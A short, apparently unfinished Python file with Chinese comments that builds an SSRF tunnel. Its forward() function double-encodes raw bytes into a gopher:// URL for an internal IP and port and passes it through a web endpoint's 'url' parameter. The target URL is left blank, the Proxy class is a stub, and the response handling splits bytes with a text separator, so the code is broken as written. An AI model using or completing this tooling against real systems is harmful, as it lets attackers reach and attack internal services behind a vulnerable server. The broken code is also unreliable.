import socket
import select
import threading
from urllib.parse import urljoin, quote
import requests
from typing import Callable

class Proxy:
    '''端口转发
    '''
    def __init__(self, data_forward_func:Callable[[bytes, str, int], bytes]) -> None:
        """代理初始化

        Args:
            data_forward_func (Callable[[bytes, str, int], bytes]): 数据转发函数，其中第一个参数为待转发数据，第二个为目标ip地址，第三个为目标端口，返回接收到的数据
        """
        self.data_forward_func = data_forward_func
        
    


def forward(data:bytes, ip:str, port:int)->bytes:
    url = ''
    payload = f'gopher://{ip}:{port}/_{quote(quote(data))}'
    headers = {
        'User-Agent': ''
    }
    res = requests.get(url, params={'url':payload}, headers=headers, timeout=10)
    return b''.join(res.content.split('\r\n')[3:])


if __name__ == '__main__':
    pass
